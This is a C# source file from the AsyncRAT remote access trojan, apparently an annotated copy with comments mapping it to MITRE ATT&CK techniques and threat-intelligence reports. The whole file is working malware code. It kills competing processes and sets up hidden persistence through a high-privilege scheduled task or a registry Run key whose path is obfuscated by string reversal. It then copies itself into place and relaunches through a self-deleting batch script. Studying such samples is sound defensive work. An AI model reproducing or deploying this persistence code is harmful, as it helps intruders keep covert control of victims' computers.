using Client.Helper;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Client.Install
{
    class NormalStartup
    {
        public static void Install()
        {
            /*
            * Install
            *   About:
            *       The install function establishes AsyncRAT persistence. Depending on whether the RAT is ran as an administrator or user the persistence wil vary.
            *       Administrator privileges will result in scheduled tasks persistence and user privileges will result in registry persistence. A batch file is also created in the users
            *       Temp folder that will execute AsyncRAT and delete itself
            *   Result:
            *       Scheduled task or registry persistence is established and AsyncRAT is launched via batch script
            *   MITRE ATT&CK Techniques:
            *       T1547.001 Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder
            *       T1053.005 Scheduled Task/Job: Scheduled Task
            *   CTI:
            *       https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia
            *       https://dciber.org/analisando-asyncrat-distribuido-na-colombia/           
            */
            try
            {
                FileInfo installPath = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
                string currentProcess = Process.GetCurrentProcess().MainModule.FileName;
                if (currentProcess != installPath.FullName) //check if payload is running from installation path
                {

                    foreach (Process P in Process.GetProcesses()) //kill any process which shares same path
                    {
                        try
                        {
                            if (P.MainModule.FileName == installPath.FullName)
                                P.Kill();
                        }
                        catch { }
                    }

                    if (Methods.IsAdmin()) //if payload is runnign as administrator install schtasks
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd",
                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                        });
                    }
                    else
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
                        {
                            key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name), "\"" + installPath.FullName + "\"");
                        }
                    }

                    FileStream fs;
                    if (File.Exists(installPath.FullName))
                    {
                        File.Delete(installPath.FullName);
                        Thread.Sleep(1000);
                    }
                    fs = new FileStream(installPath.FullName, FileMode.CreateNew);
                    byte[] clientExe = File.ReadAllBytes(currentProcess);
                    fs.Write(clientExe, 0, clientExe.Length);

                    Methods.ClientOnExit();

                    string batch = Path.GetTempFileName() + ".bat";
                    using (StreamWriter sw = new StreamWriter(batch))
                    {
                        sw.WriteLine("@echo off");
                        sw.WriteLine("timeout 3 > NUL");
                        sw.WriteLine("START " + "\"" + "\" " + "\"" + installPath.FullName + "\"");
                        sw.WriteLine("CD " + Path.GetTempPath());
                        sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                    }

                    Process.Start(new ProcessStartInfo()
                    {
                        FileName = batch,
                        CreateNoWindow = true,
                        ErrorDialog = false,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    });

                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
            }
        }

    }
}
